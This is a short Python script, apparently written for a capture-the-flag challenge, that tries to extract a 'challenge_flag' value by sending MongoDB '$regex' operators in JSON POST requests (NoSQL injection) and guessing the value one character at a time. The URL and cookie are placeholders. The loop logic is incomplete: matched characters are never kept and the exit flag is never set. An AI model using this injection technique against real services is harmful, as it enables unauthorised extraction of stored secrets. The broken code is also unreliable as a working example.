import requests
import json
import string

# URL of the API endpoint
url = "myurl"

# JSON data to be sent in the request body
options = string.ascii_letters + string.digits + "_{}!"
data = {
    "key1": "value1",
    "key2": "value2",
    "key3": "value3"
}
value = ""
flag = False
while True:
    if flag == True:
        break
    for ch in options:
        data = { "_id":"_id:3", "challenge_flag":{"$regex": value + ch} }
        # Convert the Python dictionary to a JSON string
        json_data = json.dumps(data)

        # Set the headers for the request
        headers = {
            "Content-Type": "",
            "Accept": "",
            "Cookie": ""
        }

        # Send the POST request with the JSON body
        response = requests.post(url, data=json_data, headers=headers)



        # Check the response status code
        if response.status_code == 200:
            print("Request was successful!")
            print("Response JSON:", response.json())
        else:
            print("Request failed with status code:", response.status_code)
            print("Response text:", response.text)
